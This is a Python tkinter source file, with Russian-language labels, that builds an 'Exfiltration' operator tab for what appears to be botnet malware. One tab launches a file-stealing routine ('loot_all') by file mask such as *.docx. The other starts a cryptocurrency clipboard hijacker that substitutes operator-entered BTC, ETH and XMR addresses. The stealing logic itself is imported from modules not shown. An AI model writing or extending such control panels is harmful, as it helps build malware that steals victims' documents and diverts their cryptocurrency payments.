import tkinter as tk
from tkinter import ttk, messagebox
from botnet.datagrabber import loot_all
from utils.clipboard_hijack import start_hijack
import threading

class ExfilTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        nb = ttk.Notebook(self)
        nb.pack(fill=tk.BOTH, expand=True)
        
        # Сбор данных
        grab_frame = ttk.Frame(nb)
        nb.add(grab_frame, text="Сбор данных")
        ttk.Label(grab_frame, text="Маска файлов (например *.docx):").pack(anchor=tk.W, padx=5, pady=5)
        self.mask_entry = ttk.Entry(grab_frame, width=30)
        self.mask_entry.pack(padx=5)
        ttk.Button(grab_frame, text="Запустить сбор", command=self.start_grab).pack(pady=10)
        
        # Крипто-хищник
        crypto_frame = ttk.Frame(nb)
        nb.add(crypto_frame, text="Крипто-хищник")
        ttk.Label(crypto_frame, text="BTC адрес:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.btc_entry = ttk.Entry(crypto_frame, width=35)
        self.btc_entry.grid(row=0, column=1, padx=5)
        ttk.Label(crypto_frame, text="ETH адрес:").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.eth_entry = ttk.Entry(crypto_frame, width=35)
        self.eth_entry.grid(row=1, column=1, padx=5)
        ttk.Label(crypto_frame, text="XMR адрес:").grid(row=2, column=0, padx=5, sticky=tk.W)
        self.xmr_entry = ttk.Entry(crypto_frame, width=35)
        self.xmr_entry.grid(row=2, column=1, padx=5)
        ttk.Button(crypto_frame, text="Запустить перехват", command=self.start_hijack).grid(row=3, column=0, columnspan=2, pady=10)

    def start_grab(self):
        mask = self.mask_entry.get()
        threading.Thread(target=loot_all, args=(mask,)).start()
        messagebox.showinfo("Эксфильтрация", "Сбор данных запущен")

    def start_hijack(self):
        btc = self.btc_entry.get()
        eth = self.eth_entry.get()
        xmr = self.xmr_entry.get()
        if not btc and not eth and not xmr:
            messagebox.showwarning("Крипто-хищник", "Введите хотя бы один адрес")
            return
        threading.Thread(target=start_hijack, args=(btc, eth, xmr), daemon=True).start()
        messagebox.showinfo("Крипто-хищник", "Перехват запущен")
